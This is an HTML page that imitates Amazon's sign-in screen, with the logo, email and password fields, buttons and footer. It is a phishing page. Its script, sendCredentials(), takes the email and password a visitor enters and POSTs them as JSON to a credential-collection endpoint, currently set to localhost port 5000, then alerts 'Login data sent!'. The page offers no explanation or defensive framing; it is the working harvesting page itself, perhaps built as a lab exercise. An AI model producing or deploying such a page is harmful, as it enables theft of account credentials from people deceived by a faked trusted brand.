<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Amazon Sign In</title>
        <link rel="stylesheet" href="../res/css/signin.css">
    </head>
    <body>
    <img src="../res/Amazon-Logo.png" alt="Amazon.com" height="50px" width="103px"/>

    <div id="signInBorder">
        <p id="SignInTxt">Sign in</p>

    <label>
        <strong>Email (phone for mobile accounts)</strong>
        <br>
        <input type="email" name="email" value="">
    </label>

      <br>

      <label>
        <strong>Password</strong>
        <span><a href="#" id="password">Forgot your password?</a></span>
        <br>
        <input type="password" name="password" value="">
      </label>

      <div>
        <button id="amazonSignInButton" onclick="sendCredentials()">Sign in</button>
      </div>

      <div id="createAccount">
        <h2><span>New to Amazon?</span></h2>
        <button id="newAccount" name="newAcct">Create your Amazon account</button>
      </div>



    </div>

    <hr id="footer">

    <div class="extra">
    <p class="links"><a href="#" id="first">Conditions of Use</a>
    <a href="#">Notice of Use</a>
    <a href="#">Help</a></p>
    <p class="links" id="special">
      Â© 1996-2025, Amazon.com, Inc. or its affiliates
    </p>
    </div>

    <script>
        function sendCredentials() {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;

            fetch('http://127.0.0.1:5000/api/credentiale', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email: email, password: password })
            }).then(response => {
                alert("Login data sent!");
            }).catch(error => {
                console.error("Error sending data:", error);
            });
        }
    </script>
  </body>
</html>
